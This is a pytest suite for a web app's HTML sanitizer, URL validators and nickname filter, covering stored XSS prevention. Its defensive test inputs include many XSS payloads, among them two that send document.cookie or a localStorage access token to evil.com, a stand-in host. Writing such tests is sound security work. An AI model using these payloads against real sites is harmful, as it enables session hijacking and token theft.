"""
Tests for HTML sanitization utilities.
Covers stored XSS prevention, URL validation, and nickname sanitization.
"""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest
from api.utils.sanitize import (
    sanitize_html,
    strip_html,
    sanitize_nickname,
    validate_url,
    validate_image_url,
)


class TestSanitizeHTML:
    """Test rich-text HTML sanitization (post body)."""

    def test_allows_safe_html(self):
        safe = "<p>Hello <strong>world</strong></p>"
        assert sanitize_html(safe) == safe

    def test_allows_links(self):
        html = '<a href="https://example.com">link</a>'
        result = sanitize_html(html)
        assert "https://example.com" in result
        assert "noopener" in result

    def test_allows_images(self):
        html = '<img src="https://example.com/img.jpg" alt="photo">'
        result = sanitize_html(html)
        assert "https://example.com/img.jpg" in result

    def test_allows_lists(self):
        html = "<ul><li>Item 1</li><li>Item 2</li></ul>"
        assert "<li>" in sanitize_html(html)

    # ── XSS Payload Tests ──

    def test_strips_script_tag(self):
        xss = '<script>alert("XSS")</script>'
        result = sanitize_html(xss)
        assert "<script>" not in result
        assert "alert" not in result

    def test_strips_onerror_handler(self):
        xss = '<img src=x onerror="alert(1)">'
        result = sanitize_html(xss)
        assert "onerror" not in result

    def test_strips_onload_handler(self):
        xss = '<svg onload="alert(1)">'
        result = sanitize_html(xss)
        assert "onload" not in result
        assert "<svg" not in result

    def test_strips_onmouseover(self):
        xss = '<b onmouseover="alert(1)">hover me</b>'
        result = sanitize_html(xss)
        assert "onmouseover" not in result

    def test_strips_javascript_href(self):
        xss = '<a href="javascript:alert(1)">click</a>'
        result = sanitize_html(xss)
        assert "javascript:" not in result

    def test_strips_data_uri_in_href(self):
        xss = '<a href="data:text/html,<script>alert(1)</script>">click</a>'
        result = sanitize_html(xss)
        assert "data:" not in result

    def test_strips_event_handler_case_insensitive(self):
        xss = '<img src=x oNeRrOr="alert(1)">'
        result = sanitize_html(xss)
        assert "onerror" not in result.lower()

    def test_strips_nested_script(self):
        xss = '<div><p><script>document.cookie</script></p></div>'
        result = sanitize_html(xss)
        assert "<script>" not in result

    def test_strips_iframe(self):
        xss = '<iframe src="https://evil.com"></iframe>'
        result = sanitize_html(xss)
        assert "<iframe" not in result

    def test_strips_style_expression(self):
        xss = '<div style="background:url(javascript:alert(1))">text</div>'
        result = sanitize_html(xss)
        assert "javascript:" not in result

    def test_strips_svg_script(self):
        xss = '<svg><script>alert(1)</script></svg>'
        result = sanitize_html(xss)
        assert "<script>" not in result

    def test_strips_meta_refresh(self):
        xss = '<meta http-equiv="refresh" content="0;url=https://evil.com">'
        result = sanitize_html(xss)
        assert "<meta" not in result

    def test_strips_object_tag(self):
        xss = '<object data="https://evil.com/malware.swf"></object>'
        result = sanitize_html(xss)
        assert "<object" not in result

    def test_strips_embed_tag(self):
        xss = '<embed src="https://evil.com/malware.swf">'
        result = sanitize_html(xss)
        assert "<embed" not in result

    def test_strips_form_tag(self):
        xss = '<form action="https://evil.com"><input type="submit"></form>'
        result = sanitize_html(xss)
        assert "<form" not in result

    def test_empty_input(self):
        assert sanitize_html("") == ""
        assert sanitize_html(None) == ""

    def test_cookie_theft_payload(self):
        xss = '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">'
        result = sanitize_html(xss)
        assert "onerror" not in result
        assert "document.cookie" not in result

    def test_localstorage_theft_payload(self):
        xss = '<img src=x onerror="new Image().src=\'https://evil.com?t=\'+localStorage.getItem(\'access_token\')">'
        result = sanitize_html(xss)
        assert "onerror" not in result
        assert "localStorage" not in result


class TestStripHTML:
    """Test plain-text stripping (title, comments)."""

    def test_strips_all_tags(self):
        assert strip_html("<b>bold</b>") == "bold"

    def test_strips_script(self):
        result = strip_html('<script>alert(1)</script>test')
        assert "<script>" not in result
        assert "test" in result

    def test_strips_nested_html(self):
        html = "<div><p><em>text</em></p></div>"
        assert strip_html(html) == "text"

    def test_preserves_plain_text(self):
        assert strip_html("Hello world 안녕하세요") == "Hello world 안녕하세요"

    def test_empty_input(self):
        assert strip_html("") == ""
        assert strip_html(None) == ""


class TestSanitizeNickname:
    """Test nickname character restrictions."""

    def test_allows_korean(self):
        assert sanitize_nickname("지갑수호자") == "지갑수호자"

    def test_allows_english(self):
        assert sanitize_nickname("WalletUser") == "WalletUser"

    def test_allows_underscore(self):
        assert sanitize_nickname("user_name") == "user_name"

    def test_allows_digits(self):
        assert sanitize_nickname("user123") == "user123"

    def test_strips_html_tags(self):
        assert sanitize_nickname("<script>alert</script>") == "scriptalertscript"

    def test_strips_special_chars(self):
        assert sanitize_nickname("user<>\"'&") == "user"

    def test_strips_xss_in_nickname(self):
        result = sanitize_nickname('<img/onerror=alert(1) src=x>')
        assert "<" not in result
        assert ">" not in result
        assert "=" not in result

    def test_truncates_to_20(self):
        long = "a" * 50
        assert len(sanitize_nickname(long)) == 20

    def test_empty_input(self):
        assert sanitize_nickname("") == ""


class TestValidateURL:
    """Test URL scheme validation."""

    def test_allows_https(self):
        assert validate_url("https://example.com") == "https://example.com"

    def test_allows_http(self):
        assert validate_url("http://example.com") == "http://example.com"

    def test_rejects_javascript(self):
        assert validate_url("javascript:alert(1)") is None

    def test_rejects_data(self):
        assert validate_url("data:text/html,<script>alert(1)</script>") is None

    def test_rejects_vbscript(self):
        assert validate_url("vbscript:MsgBox") is None

    def test_rejects_empty_netloc(self):
        assert validate_url("https://") is None

    def test_rejects_empty_string(self):
        assert validate_url("") is None

    def test_rejects_none(self):
        assert validate_url(None) is None

    def test_rejects_ftp(self):
        assert validate_url("ftp://example.com/file") is None


class TestValidateImageURL:
    """Test image URL validation (http/https + data:image/*)."""

    def test_allows_https_image(self):
        url = "https://cdn.example.com/photo.jpg"
        assert validate_image_url(url) == url

    def test_allows_data_jpeg(self):
        url = "data:image/jpeg;base64,/9j/4AAQ..."
        assert validate_image_url(url) == url

    def test_allows_data_png(self):
        url = "data:image/png;base64,iVBOR..."
        assert validate_image_url(url) == url

    def test_rejects_data_svg(self):
        url = "data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+"
        assert validate_image_url(url) is None

    def test_rejects_data_text_html(self):
        url = "data:text/html,<script>alert(1)</script>"
        assert validate_image_url(url) is None

    def test_rejects_javascript(self):
        assert validate_image_url("javascript:alert(1)") is None

    def test_rejects_oversized_data_uri(self):
        url = "data:image/png;base64," + "A" * (8 * 1024 * 1024)
        assert validate_image_url(url) is None
